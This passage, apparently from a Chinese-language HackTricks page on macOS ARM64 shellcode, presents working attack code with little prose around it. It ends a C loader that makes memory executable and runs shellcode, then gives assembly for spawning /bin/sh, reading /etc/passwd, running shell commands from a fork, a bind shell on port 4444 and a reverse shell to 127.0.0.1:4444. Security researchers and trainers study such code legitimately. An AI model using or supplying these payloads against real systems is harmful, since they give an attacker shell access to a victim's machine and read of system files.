void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

取自[**此处**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)，并附有解释。<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### 使用 cat 读取

目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数（x1）是一个参数数组（在内存中，这意味着一个地址栈）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 从 fork 中使用 sh 调用命令，以避免主进程被终止
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

来自 [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) 的 Bind shell，使用 **port 4444**<sup>[[2]](#references)</sup>。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

来自 [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)，revshell 到 **127.0.0.1:4444**<sup>[[3]](#references)</sup>。
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## 参考资料

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
